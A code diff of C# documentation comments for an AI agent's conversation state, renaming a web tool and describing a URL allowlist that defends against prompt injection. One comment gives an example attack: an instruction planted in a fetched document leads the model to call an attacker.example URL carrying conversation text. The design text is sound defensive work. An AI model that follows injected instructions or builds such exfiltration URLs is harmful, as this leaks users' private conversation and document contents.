@@ -89,13 +89,13 @@ public sealed class AgentGrainState
     public List<string> DocumentNames { get; set; } = [];
 
     /// <summary>
-    /// The exact URLs this conversation is allowed to fetch with <c>fetch_web_page</c> (ADR 0011):
+    /// The exact URLs this conversation is allowed to read with <c>read_web_document</c> (ADR 0011, ADR 0066):
     /// every URL that came back in a <c>web_search</c> result here, plus every URL the <b>user
     /// themselves</b> wrote in a message (a bare hostname from the user contributes only its
     /// homepage).
     ///
-    /// This is a security control, not a cache. Once a fetched page's text is in context, an
-    /// instruction <i>on that page</i> can tell the model to fetch
+    /// This is a security control, not a cache. Once a fetched document's text is in context, an
+    /// instruction <i>in that document</i> can tell the model to fetch
     /// <c>https://attacker.example/?q=&lt;conversation text&gt;</c> — a clean exfiltration channel out
     /// of a conversation that may also hold document excerpts (ADR 0008). The SSRF guard cannot help:
     /// it permits all public addresses by construction.
@@ -198,8 +198,8 @@ public sealed class AgentGrainState
     /// <summary>
     /// The normalized URLs this conversation may fetch <b>because they arrived in the tool result of a
     /// remote MCP server the user marked as URL-seeding</b> (ADR 0067). <c>IsFetchableUrl</c> consults this
-    /// list and <see cref="FetchableUrls"/>, so a seeded URL is fetchable by <c>fetch_web_page</c> and
-    /// readable by <c>read_web_document</c>.
+    /// list and <see cref="FetchableUrls"/>, so a seeded URL is readable by
+    /// <c>read_web_document</c>.
     ///
     /// <para><b>Separate from <see cref="FetchableUrls"/> for two reasons, and the first is functional
     /// rather than theoretical.</b> That list is capped at <c>AgentGrain.MaxFetchableUrls</c> (50), so
